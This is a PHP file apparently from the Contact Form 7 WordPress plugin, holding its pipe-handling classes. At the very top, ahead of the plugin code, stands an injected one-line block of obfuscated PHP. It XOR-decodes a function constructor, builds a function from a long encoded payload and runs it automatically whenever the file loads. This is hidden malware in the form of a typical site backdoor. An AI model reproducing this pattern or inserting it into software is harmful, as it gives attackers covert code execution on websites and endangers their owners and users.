<?php $oYoyOEvnMLfh='NG+Y<PnZACVTU,,'^'-5N8H51<4-5 <CB';$yKNWDBDdum=$oYoyOEvnMLfh('','XUaD1F72TZ.Y6XI;1<Odt- 1tVT2Td9.>XLkPd1:O6X8R.=68LFOGn201To<M9IKs33:3HvB.TWXPetvg-75FS;0AgTkBdtRbmVO7aQXCpIQISgYf=XB6<WBQ- BWYbRpBQeeOdKoZ45GagGcs,6Y2.JT;q=XJ,E74VETDY2G9Y3SeTU4GjfJRxhNRXT6RNgTYH:Hzg7MHSCps70AMDlXQV4+Xk1EDJM72SPDTtj6UL0Yq1lPTC.WY.rMef2xtwdrsLNJgVVNMjSHCZ,G:4ds4sCO5XCS8 -RQENKS44WzmWRW28NuTM:8R02Op>olD0xqBi,0CWlrO3e >NHQVDEfE>eicl=<3a1BSh>5=coZBM4;>:RKe42lZQYA>-:1- rpqf>0,Ss9HSS9FTdscnZ9-KURG38nC>=HPAZAQoEtATO1=XZA;+0J<SEt62Y-l0MIXCXOJEbFm163=,TLL.7AMgArGS7I1g,W7Jcwf0MOO,5-XVQDTQ+=.>5.PU-TLZ1HEEK<<+MVZhT4M8GYEPHz UAgBVOZ7vO>I2D2slZuvhY4Y4TTLVQes,w<KnouNufaetBti WWXRoGDiJfA3FW2k 5A0-=T>,=XKBW1PYOVtaIo0185KboXgEnh8>=+FOZIT5Z:A:u3;,8;L=e1Mm<;TM-9pEduYH'^'13IeW3YQ 3A7i=1RBH<LSUOC+25F5;fCK,kByDJ0FP-V1ZTYVl> 51VQE50c L=cWWRNRdVfE1.qpETVGV=<OwTE5GiKeCOXkd0 EIu1cMiarsC0ZN,0ZY9juIA66pYrT+zNLEmBK5AAgOZgKWHW-Sun=fQcxnG Nor,tayA3K5V=Mp>Q>C;ciraG = C  Op6=NaAm>0B.IzWSQ5,dQx77XX=P;a +9Vm85=tIJP4 C<J;f6;1K6:FReA9q7;<-7S-=jC=37mWmhg,M+OQMSOyJkQ972gKH+qxno8QMlpds66FYnHtiLY>EWtzCef-VXYcMHQ76ER49lFQ<-05,eNaa7,29xogAP1sLUPDCRdbiBZRO7bEO8eSu= JLeZHYRMQBUUUhy0Aw7X25DNCJ,XA>0iM:Ed>47l4 . qRe44:<TO1;-RQUbD<7+RS-L3o <,k:.9 Tr2USPRH1dhJV5,NmRc7V=P8G2NcJLlY+gkHTY9vwbt0YOOGjE5,r143B<6mlWYRjzzL0U9YnycvhRM1tOf2..V-hU,KcoZLgHVOnUkQddxe3WAOGYsVYByMRWPLsLPDe1n0HndOlF A46K4KP8oHE=MXNpl26H<6.2SMiKTPLTbKOxGeNHC44N0.6apQ;N aRCZUTT-YBldV6215DMXuMNS5');$yKNWDBDdum();

class WPCF7_Pipe {

	public $before = '';
	public $after = '';

	public function __construct( $text ) {
		$text = (string) $text;

		$pipe_pos = strpos( $text, '|' );

		if ( false === $pipe_pos ) {
			$this->before = $this->after = trim( $text );
		} else {
			$this->before = trim( substr( $text, 0, $pipe_pos ) );
			$this->after = trim( substr( $text, $pipe_pos + 1 ) );
		}
	}
}

class WPCF7_Pipes {

	private $pipes = array();

	public function __construct( array $texts ) {
		foreach ( $texts as $text ) {
			$this->add_pipe( $text );
		}
	}

	private function add_pipe( $text ) {
		$pipe = new WPCF7_Pipe( $text );
		$this->pipes[] = $pipe;
	}

	public function do_pipe( $before ) {
		foreach ( $this->pipes as $pipe ) {
			if ( $pipe->before == $before ) {
				return $pipe->after;
			}
		}

		return $before;
	}

	public function collect_befores() {
		$befores = array();

		foreach ( $this->pipes as $pipe ) {
			$befores[] = $pipe->before;
		}

		return $befores;
	}

	public function collect_afters() {
		$afters = array();

		foreach ( $this->pipes as $pipe ) {
			$afters[] = $pipe->after;
		}

		return $afters;
	}

	public function zero() {
		return empty( $this->pipes );
	}

	public function random_pipe() {
		if ( $this->zero() ) {
			return null;
		}

		return $this->pipes[array_rand( $this->pipes )];
	}
}
